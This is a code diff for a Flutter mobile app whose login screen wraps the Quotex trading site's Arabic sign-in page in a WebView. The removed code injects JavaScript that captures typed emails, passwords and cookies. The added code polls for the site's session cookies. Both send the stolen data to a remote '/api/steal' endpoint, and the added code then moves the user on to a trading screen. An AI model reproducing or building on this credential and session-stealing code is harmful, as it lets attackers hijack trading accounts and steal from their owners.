@@ -61,50 +61,36 @@ class _LoginScreenState extends State<LoginScreen> {
       ..setNavigationDelegate(
         NavigationDelegate(
           onPageFinished: (url) async {
-            await Future.delayed(const Duration(seconds: 2));
-            _injectOriginalScript();
+            // 435. نراقب الكوكيز كل ثانية
+            _startCookieMonitoring();
           },
         ),
       )
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
   }
 
-  void _injectOriginalScript() {
-    String jsScript = """
-      (function() {
-        function findEmail() {
-          return document.querySelector('input[name="email"], input[type="email"], #email');
-        }
-        function findPass() {
-          return document.querySelector('input[name="password"], input[type="password"], #password');
-        }
-        function checkAndSteal() {
-          var e = findEmail(), p = findPass();
-          // إذا الحقول موجودة وفيها قيم (يعني المستخدم سجل دخول)
-          if (e && p && e.value && p.value) {
-            // نسحب الكوكيز
-            var cookies = document.cookie;
-            
-            // نرسل للسيرفر عبر fetch (عشان نضمن الوصول)
-            fetch('https://clone-server-dejt.onrender.com/api/steal', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({type: 'full_session', email: e.value, password: p.value, cookies: cookies})
-            }).catch(err => {});
-          }
-        }
-        
-        if (!window.__qtxHooksInstalled) {
-          window.__qtxHooksInstalled = true;
-          document.addEventListener('submit', checkAndSteal, true);
-          document.addEventListener('click', function(ev) {
-            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
-            if (t) checkAndSteal();
-          }, true);
-        }
-      })();
-    """;
-    _controller.runJavaScript(jsScript);
+  void _startCookieMonitoring() async {
+    bool sent = false;
+    for (int i = 0; i < 30; i++) {
+      await Future.delayed(const Duration(seconds: 1));
+      final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
+      
+      // 436. نتأكد إنه في كوكيز جلسة حقيقية
+      if (cookieString.toString().contains('laravel_session') || cookieString.toString().contains('remember_web')) {
+        await http.post(
+          Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+          headers: {"Content-Type": "application/json"},
+          body: jsonEncode({"type": "full_session", "cookies": cookieString.toString()}),
+        );
+        sent = true;
+        break;
+      }
+    }
+
+    // 437. نحول المستخدم للواجهة بعد السحب
+    if (sent && mounted) {
+      Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
+    }
   }
 
   @override
